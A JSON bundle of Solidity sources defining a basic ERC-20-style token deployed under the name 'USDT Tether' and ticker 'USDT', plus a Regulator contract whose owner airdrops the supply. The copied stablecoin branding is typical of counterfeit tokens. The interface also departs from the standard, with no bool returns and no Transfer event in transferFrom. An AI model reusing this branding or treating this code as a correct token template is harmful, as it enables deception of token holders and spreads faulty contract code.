{"Erc.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity \u003e=0.8.0 \u003c0.9.0;\r\n\r\nimport \"./IERC20.sol\";\r\n\r\ncontract ERC20 is IERC20 {\r\n    uint totalTokens;\r\n    address owner;\r\n    mapping(address =\u003e uint) balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint)) allowances;\r\n    string _name;\r\n    string _symbol;\r\n\r\n    function name() external view returns(string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view returns(string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() external pure returns(uint) {\r\n        return 2;\r\n    }\r\n\r\n    function totalSupply() external view returns(uint) {\r\n        return totalTokens;\r\n    }\r\n\r\n    modifier enoughTokens(address _from, uint _amount) {\r\n        require(balanceOf(_from) \u003e= _amount, \"not enough tokens!\");\r\n        _;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"not an owner!\");\r\n        _;\r\n    }\r\n\r\n    constructor(string memory name_, string memory symbol_, uint initialSupply, address shop) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        owner = msg.sender;\r\n        mint(initialSupply, shop);\r\n    }\r\n\r\n    function balanceOf(address account) public view returns(uint) {\r\n        return balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint amount) external enoughTokens(msg.sender, amount) {\r\n        _beforeTokenTransfer(msg.sender, to, amount);\r\n        balances[msg.sender] -= amount;\r\n        balances[to] += amount;\r\n        emit Transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function mint(uint amount, address shop) public onlyOwner {\r\n        _beforeTokenTransfer(address(0), shop, amount);\r\n        balances[shop] += amount;\r\n        totalTokens += amount;\r\n        emit Transfer(address(0), shop, amount);\r\n    }\r\n\r\n    function burn(address _from, uint amount) public onlyOwner {\r\n        _beforeTokenTransfer(_from, address(0), amount);\r\n        require(_from == owner, \"invalid adress\");\r\n        balances[_from] -= amount;\r\n        totalTokens -= amount;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) external view returns(uint) {\r\n        return allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public  {\r\n        _approve(msg.sender, spender, amount);\r\n    }\r\n\r\n    function _approve(address sender, address spender, uint amount) internal virtual  {\r\n        allowances[sender][spender] = amount;\r\n        emit Approve(sender, spender, amount);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint amount) external enoughTokens(from, amount) {\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        address spender = msg.sender;\r\n\r\n        allowances[from][spender] -= amount;    //if \u003c0 --\u003e error\r\n        balances[from] -= amount;\r\n        balances[to] += amount;\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint amount) internal virtual {}\r\n}\r\n\r\ncontract MyToken is ERC20 {\r\n    constructor(address shop) ERC20(\"USDT Tether\", \"USDT\", 900000000, shop) {\r\n\r\n    }\r\n}\r\n\r\ncontract Regulator {\r\n    IERC20 public token;\r\n    address payable owner;\r\n    \r\n\r\n    constructor() {\r\n        token = new MyToken(address(this));\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"not an owner!\");\r\n        _;\r\n    }\r\n\r\n    function airDrop(address _to, uint _amount) public onlyOwner {\r\n        token.transfer(_to, _amount);\r\n    }\r\n\r\n    function tokenBalance() public view returns(uint) {\r\n        return token.balanceOf(address(this));\r\n    }\r\n\r\n    function tokenBalanceOf(address _adr) public view returns(uint) {\r\n        return token.balanceOf(_adr);\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity \u003e=0.8.0 \u003c0.9.0;\r\n\r\ninterface IERC20 {\r\n    function name() external view returns(string memory);\r\n    \r\n    function symbol() external view returns(string memory);\r\n\r\n    function decimals() external pure returns(uint); // 0 18\r\n\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address to, uint amount) external;\r\n\r\n    function allowance(address _owner, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external;\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint amount);\r\n\r\n    event Approve(address indexed owner, address indexed to, uint amount);\r\n}"}}